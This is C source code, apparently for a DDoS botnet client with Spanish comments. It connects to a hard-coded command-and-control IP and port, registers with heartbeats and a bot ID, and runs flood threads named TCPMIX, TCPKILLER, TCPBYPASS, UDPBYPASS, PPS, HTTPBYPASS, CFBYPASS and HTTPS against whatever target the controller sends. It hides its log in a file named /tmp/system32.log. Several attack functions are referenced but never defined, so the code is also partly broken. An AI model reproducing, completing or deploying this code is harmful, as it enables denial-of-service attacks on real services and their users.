#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

#define CNC_IP "172.96.140.62"
#define CNC_PORT 14037

void log_msg(const char* msg) {
    FILE* f = fopen("/tmp/system32.log", "a");
    if(f) {
        fprintf(f, "[%ld] %s\n", time(NULL), msg);
        fclose(f);
    }
}

void rand_str(char *dest, int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < length; i++) {
        dest[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// ========== TCP (SIN ROOT) ==========
// ========== TCPMIX (Adaptado de attack_tcpflood) ==========
void* tcpmix_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("TCPMIX attack started");
    
    time_t end = time(NULL) + duration;
    
    while(time(NULL) < end) {
        // Crear múltiples sockets como en attack_tcpflood
        for(int thread = 0; thread < 10; thread++) {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if(fd < 0) continue;
            
            // Configuraciones avanzadas
            int flags = 1;
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &flags, sizeof(flags));
            
            // Non-blocking
            fcntl(fd, F_SETFL, O_NONBLOCK);
            
            // Variar TTL
            int ttl = 64 + (rand() % 64);
            setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
            
            struct sockaddr_in target;
            target.sin_family = AF_INET;
            target.sin_port = htons(port);
            inet_pton(AF_INET, ip, &target.sin_addr);
            
            // Puerto fuente aleatorio
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(1024 + (rand() % 64512));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
            
            // Conexión asíncrona
            connect(fd, (struct sockaddr*)&target, sizeof(target));
            
            // Enviar datos pequeños
            if(rand() % 10 == 0) {
                char buf[64];
                rand_str(buf, sizeof(buf));
                send(fd, buf, sizeof(buf), MSG_NOSIGNAL | MSG_DONTWAIT);
            }
            
            close(fd);
        }
        usleep(500);
    }
    
    log_msg("TCPMIX finished");
    free(params);
    return NULL;
}

// ========== TCPKILLER (Adaptado de attack_tcpkiller) ==========
void* tcpkiller_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("TCPKILLER attack started");
    
    time_t end = time(NULL) + duration;
    
    while(time(NULL) < end) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if(fd < 0) {
            usleep(1000);
            continue;
        }
        
        // Configuración agresiva de cierre
        struct linger lin;
        lin.l_onoff = 1;
        lin.l_linger = 0;
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &lin, sizeof(lin));
        
        // Non-blocking
        fcntl(fd, F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target.sin_addr);
        
        // Puerto fuente aleatorio
        struct sockaddr_in src_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(49152 + (rand() % 16384));
        src_addr.sin_addr.s_addr = INADDR_ANY;
        
        bind(fd, (struct sockaddr*)&src_addr, sizeof(src_addr));
        
        // Conectar y cerrar inmediatamente
        connect(fd, (struct sockaddr*)&target, sizeof(target));
        
        // Enviar datos corruptos
        if(rand() % 3 == 0) {
            char corrupt[16];
            memset(corrupt, 0xFF, sizeof(corrupt));
            send(fd, corrupt, sizeof(corrupt), MSG_NOSIGNAL);
        }
        
        // Cierre agresivo
        shutdown(fd, SHUT_RDWR);
        close(fd);
        
        usleep(1000); // 1ms entre ataques
    }
    
    log_msg("TCPKILLER finished");
    free(params);
    return NULL;
}

// ========== TCPBYPASS (Adaptado de attack_tcpbypass) ==========
void* tcpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("TCPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Pool de conexiones
    int conn_pool[20];
    struct sockaddr_in targets[20];
    
    for(int i = 0; i < 20; i++) {
        conn_pool[i] = -1;
        targets[i].sin_family = AF_INET;
        targets[i].sin_port = htons(port);
        inet_pton(AF_INET, ip, &targets[i].sin_addr);
    }
    
    while(time(NULL) < end) {
        for(int i = 0; i < 20; i++) {
            // Crear/reusar conexiones
            if(conn_pool[i] < 0 || (rand() % 100) == 0) {
                if(conn_pool[i] >= 0) close(conn_pool[i]);
                
                conn_pool[i] = socket(AF_INET, SOCK_STREAM, 0);
                if(conn_pool[i] < 0) continue;
                
                // Optimizaciones
                int flags = 1;
                setsockopt(conn_pool[i], SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
                setsockopt(conn_pool[i], SOL_SOCKET, SO_KEEPALIVE, &flags, sizeof(flags));
                setsockopt(conn_pool[i], IPPROTO_TCP, TCP_NODELAY, &flags, sizeof(flags));
                
                // Variar MSS
                int mss = 536 + (rand() % 1000);
                setsockopt(conn_pool[i], IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
                
                fcntl(conn_pool[i], F_SETFL, O_NONBLOCK);
                
                // Puerto fuente aleatorio
                struct sockaddr_in src_addr;
                memset(&src_addr, 0, sizeof(src_addr));
                src_addr.sin_family = AF_INET;
                src_addr.sin_port = htons(32768 + (rand() % 32768));
                src_addr.sin_addr.s_addr = INADDR_ANY;
                
                bind(conn_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
                
                // Conexión asíncrona
                connect(conn_pool[i], (struct sockaddr*)&targets[i], sizeof(struct sockaddr_in));
            }
            
            // Enviar datos con fragmentación
            if(rand() % 10 == 0) {
                char data[128];
                rand_str(data, sizeof(data));
                
                // Envío fragmentado
                int frag_size = 64 + (rand() % 64);
                int sent = 0;
                while(sent < sizeof(data)) {
                    int to_send = (sizeof(data) - sent) > frag_size ? frag_size : (sizeof(data) - sent);
                    send(conn_pool[i], data + sent, to_send, MSG_NOSIGNAL | MSG_DONTWAIT);
                    sent += to_send;
                    
                    if(rand() % 2 == 0)
                        usleep(rand() % 10);
                }
            }
        }
        
        usleep(1 + (rand() % 20));
    }
    
    // Limpiar pool
    for(int i = 0; i < 20; i++) {
        if(conn_pool[i] >= 0) close(conn_pool[i]);
    }
    
    log_msg("TCPBYPASS finished");
    free(params);
    return NULL;
}

// ========== UDPBYPASS (Adaptado de attack_udpbypass) ==========
void* udpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("UDPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Pool de sockets UDP
    int sock_pool[50];
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Inicializar pool
    for(int i = 0; i < 50; i++) {
        sock_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock_pool[i] >= 0) {
            int flags = 1;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
            setsockopt(sock_pool[i], SOL_SOCKET, SO_BROADCAST, &flags, sizeof(flags));
            
            // Buffer grande
            int buf_size = 2 * 1024 * 1024;
            setsockopt(sock_pool[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            
            // Puerto fuente aleatorio
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(32768 + (rand() % 32768));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            
            bind(sock_pool[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            
            connect(sock_pool[i], (struct sockaddr*)&target, sizeof(target));
        }
    }
    
    while(time(NULL) < end) {
        for(int i = 0; i < 50; i++) {
            if(sock_pool[i] < 0) continue;
            
            // Variar tamaño de paquete
            int packet_size = 500 + (rand() % 1000);
            char buffer[packet_size];
            rand_str(buffer, packet_size);
            
            send(sock_pool[i], buffer, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT);
            
            // Rotación de sockets
            if(rand() % 1000 == 0) {
                close(sock_pool[i]);
                sock_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if(sock_pool[i] >= 0) {
                    connect(sock_pool[i], (struct sockaddr*)&target, sizeof(target));
                }
            }
        }
        
        usleep(rand() % 10);
    }
    
    // Limpiar
    for(int i = 0; i < 50; i++) {
        if(sock_pool[i] >= 0) close(sock_pool[i]);
    }
    
    log_msg("UDPBYPASS finished");
    free(params);
    return NULL;
}

// ========== PPS (Packets Per Second) ==========
void* pps_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("PPS attack started");
    
    time_t end = time(NULL) + duration;
    
    // Múltiples sockets UDP para máximo PPS
    int socks[30];
    for(int i = 0; i < 30; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if(socks[i] >= 0) {
            int buf_size = 1024 * 1024 * 10;
            setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        }
    }
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Paquete pequeño para máximo PPS
    char small_packet[64];
    memset(small_packet, 'X', sizeof(small_packet));
    
    while(time(NULL) < end) {
        for(int i = 0; i < 30; i++) {
            if(socks[i] < 0) continue;
            
            // Ráfaga masiva
            for(int burst = 0; burst < 500; burst++) {
                sendto(socks[i], small_packet, sizeof(small_packet), 
                      MSG_NOSIGNAL | MSG_DONTWAIT,
                      (struct sockaddr*)&target, sizeof(target));
            }
        }
        usleep(100);
    }
    
    for(int i = 0; i < 30; i++) {
        if(socks[i] >= 0) close(socks[i]);
    }
    
    log_msg("PPS finished");
    free(params);
    return NULL;
}

// ========== HTTPBYPASS ==========
void* httpbypass_attack(void* arg) {
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    log_msg("HTTPBYPASS attack started");
    
    time_t end = time(NULL) + duration;
    
    // User-Agents realistas
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "curl/7.88.1",
        "python-requests/2.31.0",
        "Go-http-client/1.1"
    };
    
    const char* hosts[] = {
        "example.com", "www.example.com", "api.example.com",
        "blog.example.com", "store.example.com"
    };
    
    while(time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            usleep(50000);
            continue;
        }
        
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target.sin_addr);
        
        // Timeout
        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if(connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
            const char* ua = user_agents[rand() % 5];
            const char* host = hosts[rand() % 5];
            
            char request[1024];
            
            // 70% GET, 30% POST
            if(rand() % 100 < 70) {
                snprintf(request, sizeof(request),
                        "GET / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Connection: close\r\n\r\n",
                        host, ua);
            } else {
                snprintf(request, sizeof(request),
                        "POST /api/login HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 23\r\n"
                        "Connection: close\r\n\r\n"
                        "username=test&password=test",
                        host, ua);
            }
            
            send(sock, request, strlen(request), MSG_NOSIGNAL);
            
            // Leer respuesta
            char buffer[2048];
            recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
            
            usleep(30000 + (rand() % 70000));
        }
        
        close(sock);
        usleep(10000 + (rand() % 40000));
    }
    
    log_msg("HTTPBYPASS finished");
    free(params);
    return NULL;
}

// ========== CFBYPASS (usa HTTPBYPASS) ==========
void* cfbypass_attack(void* arg) {
    // CloudFlare bypass es básicamente HTTPBYPASS
    return httpbypass_attack(arg);
}

// ========== HTTPS ==========
void* https_attack(void* arg) {
    // HTTPS es igual que HTTP pero con puerto 443 por defecto
    char* params = (char*)arg;
    char ip[64];
    int port, duration;
    
    sscanf(params, "%63s %d %d", ip, &port, &duration);
    
    // Si no se especifica puerto, usar 443
    if(port == 0) port = 443;
    
    log_msg("HTTPS attack started");
    
    // Usar la misma función de HTTP
    return httpbypass_attack(arg);
}



// ========== MANEJO DE COMANDOS ==========
void handle_command(int sock, char* buffer) {
    log_msg(buffer);
    
    if(strstr(buffer, ".attack")) {
        log_msg("Attack command received!");
        
        char* cmd = strstr(buffer, ".attack");
        if(cmd) {
            char method[32], ip[64];
            int port, duration;
            
            int parsed = sscanf(cmd, ".attack %31s %63s %d %d", 
                               method, ip, &port, &duration);
            
            if(parsed == 4) {
                char log[256];
                snprintf(log, sizeof(log), "Parsed: %s %s:%d %ds", 
                         method, ip, port, duration);
                log_msg(log);
                
                char params[256];
                snprintf(params, sizeof(params), "%s %d %d", ip, port, duration);
                char* params_copy = strdup(params);
                
                if(params_copy) {
                    pthread_t thread;
                    void* (*attack_func)(void*) = NULL;
                    
                    // Mapear todos los métodos
                    if(strcasecmp(method, "TCP") == 0) {
                        attack_func = tcp_attack;
                    }
                    else if(strcasecmp(method, "UDP") == 0) {
                        attack_func = udp_attack;
                    }
                    else if(strcasecmp(method, "HTTP") == 0) {
                        attack_func = http_attack;
                    }
                    else if(strcasecmp(method, "DNS") == 0) {
                        attack_func = dns_attack;
                    }
                    else if(strcasecmp(method, "TCPMIX") == 0) {
                        attack_func = tcpmix_attack;
                    }
                    else if(strcasecmp(method, "TCPKILLER") == 0) {
                        attack_func = tcpkiller_attack;
                    }
                    else if(strcasecmp(method, "TCPBYPASS") == 0) {
                        attack_func = tcpbypass_attack;
                    }
                    else if(strcasecmp(method, "UDPBYPASS") == 0) {
                        attack_func = udpbypass_attack;
                    }
                    else if(strcasecmp(method, "PPS") == 0) {
                        attack_func = pps_attack;
                    }
                    else if(strcasecmp(method, "HTTPBYPASS") == 0) {
                        attack_func = httpbypass_attack;
                    }
                    else if(strcasecmp(method, "CFBYPASS") == 0) {
                        attack_func = cfbypass_attack;
                    }
                    else if(strcasecmp(method, "HTTPS") == 0) {
                        attack_func = https_attack;
                    }
                    
                    if(attack_func) {
                        pthread_create(&thread, NULL, attack_func, params_copy);
                        pthread_detach(thread);
                        log_msg("Attack thread started");
                    } else {
                        free(params_copy);
                        log_msg("Unknown attack method");
                    }
                }
            }
        }
    }
    else if(strstr(buffer, ".stop")) {
        log_msg("Stop command received");
    }
    else if(strstr(buffer, "PING")) {
        send(sock, "PONG\n", 5, 0);
        log_msg("PING responded");
    }
    else if(strstr(buffer, "BOT_ID")) {
        log_msg("Bot ID assigned by CNC");
    }
}

// ========== MAIN Y DAEMON ==========
void run_bot_logic() {
    log_msg("Bot logic started");
    
    srand(time(NULL));
    
    while(1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            sleep(5);
            continue;
        }
        
        // Configurar timeout de conexión
        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(CNC_PORT);
        inet_pton(AF_INET, CNC_IP, &server.sin_addr);
        
        log_msg("Attempting to connect to CNC...");
        
        if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            char err_msg[256];
            snprintf(err_msg, sizeof(err_msg), "Connect failed: %s", strerror(errno));
            log_msg(err_msg);
            close(sock);
            sleep(10); // Esperar más antes de reintentar
            continue;
        }
        
        log_msg("Connected to CNC");
        
        // 1. ENVIAR HEARTBEAT CON FORMATO CORRECTO
        const char* heartbeat = "HEARTBEAT:x86_64\n";
        int sent = send(sock, heartbeat, strlen(heartbeat), MSG_NOSIGNAL);
        
        char log_buf[256];
        snprintf(log_buf, sizeof(log_buf), "Sent heartbeat: %d bytes", sent);
        log_msg(log_buf);
        
        // 2. ESPERAR BOT_ID (timeout de 5 segundos)
        char init_buf[256];
        memset(init_buf, 0, sizeof(init_buf));
        
        fd_set read_fds;
        struct timeval timeout;
        
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        
        int ret = select(sock + 1, &read_fds, NULL, NULL, &timeout);
        
        if(ret > 0) {
            int n = recv(sock, init_buf, sizeof(init_buf)-1, 0);
            if(n > 0) {
                init_buf[n] = 0;
                snprintf(log_buf, sizeof(log_buf), "CNC response: %s", init_buf);
                log_msg(log_buf);
                
                if(strstr(init_buf, "BOT_ID")) {
                    log_msg("Bot registered in CNC");
                }
            } else if(n == 0) {
                log_msg("CNC closed connection");
                close(sock);
                sleep(5);
                continue;
            } else {
                log_msg("Error receiving BOT_ID");
            }
        } else if(ret == 0) {
            log_msg("Timeout waiting for BOT_ID");
            close(sock);
            sleep(5);
            continue;
        } else {
            log_msg("Select error waiting for BOT_ID");
            close(sock);
            sleep(5);
            continue;
        }
        
        // Restaurar timeout a infinito para comandos normales
        tv.tv_sec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        char buffer[1024];
        time_t last_heartbeat = time(NULL);
        
        // 3. BUCLE PRINCIPAL (mantener conexión)
        while(1) {
            // Enviar heartbeat periódico
            if(time(NULL) - last_heartbeat > 30) {
                send(sock, "PONG\n", 5, MSG_NOSIGNAL);
                last_heartbeat = time(NULL);
                log_msg("Periodic heartbeat sent");
            }
            
            // Leer comandos del CNC
            memset(buffer, 0, sizeof(buffer));
            int n = recv(sock, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
            
            if(n > 0) {
                buffer[n] = 0;
                handle_command(sock, buffer);
            } else if(n == 0) {
                log_msg("CNC disconnected");
                break;
            } else if(errno != EAGAIN && errno != EWOULDBLOCK) {
                log_msg("Receive error");
                break;
            }
            
            usleep(100000); // 100ms
        }
        
        close(sock);
        log_msg("Disconnected from CNC, reconnecting in 3s...");
        sleep(3);
    }
}